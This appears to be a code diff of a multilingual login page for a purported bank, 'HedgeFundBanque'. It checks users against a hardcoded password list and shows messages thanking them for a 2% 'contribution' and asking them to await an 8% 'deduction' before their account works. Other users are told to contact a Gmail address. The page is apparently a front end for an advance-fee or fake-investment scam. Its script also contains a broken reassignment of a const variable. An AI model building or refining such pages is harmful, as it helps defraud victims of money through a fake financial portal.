@@ -13,7 +13,11 @@
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            color: #00008B; /* Couleur bleu de nuit */
+        }
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
         }
         .container {
             text-align: center;
@@ -26,14 +30,11 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 20px;
         }
         input {
             margin: 10px 0;
             padding: 10px;
             width: 200px;
-            border: 2px solid #00008B; /* Couleur bleu de nuit */
-            border-radius: 4px;
         }
         button {
             padding: 10px 20px;
@@ -44,41 +45,32 @@
             margin-top: 20px;
         }
         .progress {
-            display: none;
+            width: 50%;
+            height: 10px;
+            background: lightgrey;
             margin-top: 20px;
-            width: 200px;
-            height: 20px;
-            background-color: #f3f3f3;
-            border: 1px solid #00008B; /* Couleur bleu de nuit */
-            border-radius: 10px;
-            overflow: hidden;
+            display: none;
         }
         .progress-bar {
-            height: 100%;
             width: 0;
-            background-color: #00008B; /* Couleur bleu de nuit */
-            transition: width 1s;
-        }
-        .language-selector {
-            position: absolute;
-            top: 10px;
-            right: 10px;
+            height: 100%;
+            background: green;
         }
     </style>
 </head>
 <body>
+    <div class="language-selector">
+        <select id="language" onchange="changeLanguage()">
+            <option value="fr">Français</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="de">Deutsch</option>
+            <option value="zh">中文</option>
+            <option value="ar">العربية</option>
+            <option value="ru">Русский</option>
+        </select>
+    </div>
     <div class="container">
-        <div class="language-selector">
-            <select id="language" onchange="changeLanguage()">
-                <option value="fr">Français</option>
-                <option value="en">English</option>
-                <option value="es">Español</option>
-                <option value="de">Deutsch</option>
-                <option value="zh">中文</option>
-                <option value="ar">العربية</option>
-                <option value="ru">Русский</option>
-            </select>
-        </div>
         <img id="logo" src="logo.png" alt="Logo HedgeFundBanque">
         <form id="login-form">
             <input type="email" id="email" placeholder="Email" required>
@@ -89,7 +81,6 @@
             <div class="progress-bar" id="progress-bar"></div>
         </div>
         <p id="message"></p>
-        <p id="countdown"></p>
     </div>
     <script>
         const validPasswords = [
@@ -104,57 +95,48 @@
             'JkLzXc56', 'VbNmQw78', 'ErTyUi90', 'OpAsDf12', 'GhJkLz34', 'XcVbNm56', 'QwErTy78', 'UiOpAs90', 'DfGhJk12'
         ];
 
-        const messages = {
-            "fr": {
-                "congratulations": "Félicitations pour vos efforts, votre compte sera déduit dans 72 heures.",
-                "codeInUse": "Ce code est déjà utilisé par une autre personne.",
-                "contactSupport": "Veuillez contacter le support technique.",
-                "accountReady": "Votre compte est maintenant opérationnel."
-            },
-            "en": {
-                "congratulations": "Congratulations on your efforts, your account will be debited within 72 hours.",
-                "codeInUse": "This code is already used by another person.",
-                "contactSupport": "Please contact technical support.",
-                "accountReady": "Your account is now operational."
-            },
-            "es": {
-                "congratulations": "Felicitaciones por sus esfuerzos, su cuenta se debitará en 72 horas.",
-                "codeInUse": "Este código ya está siendo utilizado por otra persona.",
-                "contactSupport": "Por favor, póngase en contacto con el soporte técnico.",
-                "accountReady": "Su cuenta ya está operativa."
-            },
-            "de": {
-                "congratulations": "Glückwunsch zu Ihren Bemühungen, Ihr Konto wird innerhalb von 72 Stunden belastet.",
-                "codeInUse": "Dieser Code wird bereits von einer anderen Person verwendet.",
-                "contactSupport": "Bitte wenden Sie sich an den technischen Support.",
-                "accountReady": "Ihr Konto ist jetzt betriebsbereit."
-            },
-            "zh": {
-                "congratulations": "恭喜您的努力，您的账户将在72小时内扣款。",
-                "codeInUse": "此代码已被其他人使用。",
-                "contactSupport": "请联系技术支持。",
-                "accountReady": "您的账户现在已激活。"
-            },
-            "ar": {
-                "congratulations": "تهانينا على جهودك ، سيتم خصم حسابك خلال 72 ساعة.",
-                "codeInUse": "هذا الرمز مستخدم بالفعل من قبل شخص آخر.",
-                "contactSupport": "يرجى الاتصال بالدعم الفني.",
-                "accountReady": "حسابك الآن جاهز للعمل."
-            },
-            "ru": {
-                "congratulations": "Поздравляем с вашими усилиями, ваш счет будет списан в течение 72 часов.",
-                "codeInUse": "Этот код уже используется другим человеком.",
-                "contactSupport": "Пожалуйста, свяжитесь с технической поддержкой.",
-                "accountReady": "Ваш аккаунт теперь активен."
-            }
-        };
-
-        let usedPasswords = JSON.parse(localStorage.getItem('usedPasswords') || '{}');
-        let startTime = localStorage.getItem('startTime');
+        const usedPasswords = {};
 
         function login() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const progressBar = document.getElementById('progress-bar');
             const message = document.getElementById('message');
-            const countdown
+
+            if (validPasswords.includes(password)) {
+                if (!usedPasswords[password]) {
+                    usedPasswords[password] = email;
+                    progressBar.style.width = '90%';
+                    message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du déduction de 8%, votre compte sera opérationnel une fois être déduit.";
+                } else if (usedPasswords[password] === email) {
+                    progressBar.style.width = '90%';
+                    message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du déduction de 8%, votre compte sera opérationnel une fois être déduit.";
+                } else {
+                    progressBar.style.width = '50%';
+                    message.innerHTML = "Pour avoir accès à votre compte HedgeFundBanque, contactez l'équipe technique à hfbks9619@gmail.com ou entrez en contact avec le service client temporaire.";
+                }
+            } else {
+                progressBar.style.width = '50%';
+                message.innerHTML = "Pour avoir accès à votre compte HedgeFundBanque, contactez l'équipe technique à hfbks9619@gmail.com ou entrez en contact avec le service client temporaire.";
+            }
+
+            document.querySelector('.progress').style.display = 'block';
+            message.style.display = 'block';
+            localStorage.setItem('usedPasswords', JSON.stringify(usedPasswords));
+        }
+
+        function changeLanguage() {
+            const language = document.getElementById('language').value;
+            // Logique pour changer la langue de l'interface
+            // À implémenter selon vos besoins spécifiques
+        }
+
+        window.onload = function() {
+            const storedUsedPasswords = localStorage.getItem('usedPasswords');
+            if (storedUsedPasswords) {
+                usedPasswords = JSON.parse(storedUsedPasswords);
+            }
+        }
+    </script>
+</body>
+</html>
